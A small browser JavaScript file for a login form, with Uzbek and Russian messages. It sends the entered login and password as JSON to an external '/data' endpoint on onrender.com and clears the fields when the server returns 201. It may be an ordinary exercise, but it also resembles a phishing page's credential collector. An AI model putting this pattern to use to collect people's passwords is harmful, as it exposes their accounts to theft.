let inps = document.querySelectorAll('.form-control')
let btn = document.querySelector('.btn')
let mistake = document.querySelector('#eror_message')
let regex = /^.{6,}$/
let regextwo = /^.$/

inps[1].addEventListener('keyup', (e) => {
    if (regex.test(inps[1].value)) {
        btn.classList.remove('key')
    } else {
        btn.classList.add('key')
    }
})

btn.addEventListener('click', (e) => {
    fetch('https://docker-s8b4.onrender.com/data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            login: inps[0].value,
            password: inps[1].value
        })
    })
        .then(res =>{
            if(res.status===201){
                inps[0].value=''
                inps[1].value=''
            }else{
                alert('xatolik yuzaga keldi')
            }
        })
       
        .catch(er => {
            mistake.textContent = `
            Пожалуйста, введите свой пароль и войдите в систему полностью
            `
            alert('error')
        })
})